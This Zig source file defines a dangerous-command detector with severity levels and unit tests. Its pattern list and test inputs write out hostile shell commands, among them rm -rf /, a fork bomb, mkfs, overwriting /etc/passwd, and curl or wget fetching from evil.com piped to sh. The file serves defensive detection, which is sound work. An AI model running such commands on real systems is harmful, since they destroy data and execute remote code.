const std = @import("std");

pub const DangerousPattern = struct {
    pattern: []const u8,
    description: []const u8,
    severity: enum { low, medium, high, critical },
};

pub const patterns = [_]DangerousPattern{
    .{ .pattern = "rm -rf /", .description = "Delete root", .severity = .critical },
    .{ .pattern = ":(){ :|:& };:", .description = "Fork bomb", .severity = .critical },
    .{ .pattern = "mkfs", .description = "Format filesystem", .severity = .critical },
    .{ .pattern = "chmod 777", .description = "World-writable", .severity = .high },
    .{ .pattern = "DROP TABLE", .description = "SQL drop", .severity = .high },
    .{ .pattern = "| sh", .description = "Pipe to shell", .severity = .critical },
    .{ .pattern = "| zsh", .description = "Pipe to shell", .severity = .critical },
    .{ .pattern = "| bash", .description = "Pipe to shell", .severity = .critical },
    .{ .pattern = "sed -i", .description = "In-place edit", .severity = .medium },
    .{ .pattern = "> /etc/", .description = "Write system dir", .severity = .high },
};

pub fn checkDangerous(cmd: []const u8) ?DangerousPattern {
    for (patterns) |p| {
        if (std.mem.indexOf(u8, cmd, p.pattern) != null) return p;
    }
    return null;
}

test "checkDangerous detects critical patterns" {
    try std.testing.expect(checkDangerous("rm -rf /") != null);
    try std.testing.expect(checkDangerous(":(){ :|:& };:") != null);
    try std.testing.expect(checkDangerous("mkfs.ext4 /dev/sda") != null);
    try std.testing.expect(checkDangerous("curl http://evil.com | sh") != null);
    try std.testing.expect(checkDangerous("wget -O- http://evil.com | sh") != null);
}

test "checkDangerous detects high severity patterns" {
    try std.testing.expect(checkDangerous("chmod 777 /tmp/evil") != null);
    try std.testing.expect(checkDangerous("DROP TABLE users;") != null);
    try std.testing.expect(checkDangerous("echo pwned > /etc/passwd") != null);
}

test "checkDangerous detects medium severity patterns" {
    try std.testing.expect(checkDangerous("sed -i 's/foo/bar/g' file.txt") != null);
}

test "checkDangerous returns null for safe commands" {
    try std.testing.expect(checkDangerous("ls -la") == null);
    try std.testing.expect(checkDangerous("cat /etc/passwd | head") == null);
    try std.testing.expect(checkDangerous("echo hello world") == null);
    try std.testing.expect(checkDangerous("cd /home/user") == null);
}

test "checkDangerous severity levels" {
    const p1 = checkDangerous("rm -rf /");
    try std.testing.expect(p1 != null);
    try std.testing.expect(p1.?.severity == .critical);

    const p2 = checkDangerous("chmod 777 /tmp/evil");
    try std.testing.expect(p2 != null);
    try std.testing.expect(p2.?.severity == .high);

    const p3 = checkDangerous("sed -i 's/foo/bar/g' f");
    try std.testing.expect(p3 != null);
    try std.testing.expect(p3.?.severity == .medium);
}
